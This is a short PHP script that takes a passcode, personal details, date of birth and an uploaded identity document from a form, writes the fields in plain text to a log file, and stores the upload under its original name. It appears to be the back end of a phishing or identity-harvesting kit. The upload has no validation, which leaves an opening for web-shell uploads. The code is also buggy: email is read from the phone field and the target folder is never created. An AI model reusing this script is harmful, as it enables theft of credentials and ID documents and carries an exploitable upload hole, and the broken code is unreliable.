<?php

// Define the path to the log file and upload directory
$logFile = '../../files/' . time() . '/id.log'; // Specify the log file path
$uploadDir = '../../files/' . time() . '/'; // Specify the directory for file uploads

// Function to safely get form data
function getPostData($key) {
    return isset($_POST[$key]) ? htmlspecialchars($_POST[$key], ENT_QUOTES, 'UTF-8') : '';
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Extract the data from the form
    $passcode = getPostData('passcode');
    $firstName = getPostData('firstName');
    $lastName = getPostData('name'); // Assuming 'name' is for the last name
    $email = getPostData('phone'); // Assuming 'phone' is for the email
    $phone = getPostData('phone');
    $dateOfBirth = getPostData('dateOfBirth');
    // ... (continue for other fields)

    // Prepare the log entry
    $logEntry = "Passcode: $passcode, First Name: $firstName, Last Name: $lastName, Email: $email, Phone: $phone, Date of Birth: $dateOfBirth\n";

    // Write to log file
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

    // Handle file upload
    if (isset($_FILES['identity']) && $_FILES['identity']['error'] == 0) {
        $identityFile = $_FILES['identity']['name'];
        $tempName = $_FILES['identity']['tmp_name'];
        $path = $uploadDir . basename($identityFile);

        // Move the file to the upload directory
        if (move_uploaded_file($tempName, $path)) {
            echo "File uploaded successfully.";
        } else {
            echo "File upload failed.";
        }
    } else {
        echo "No file uploaded or file upload error.";
    }

    // Redirect or send a response here if needed
    // header('Location: thank_you_page.php'); // Redirect to a thank you page
    // exit;
}
?>
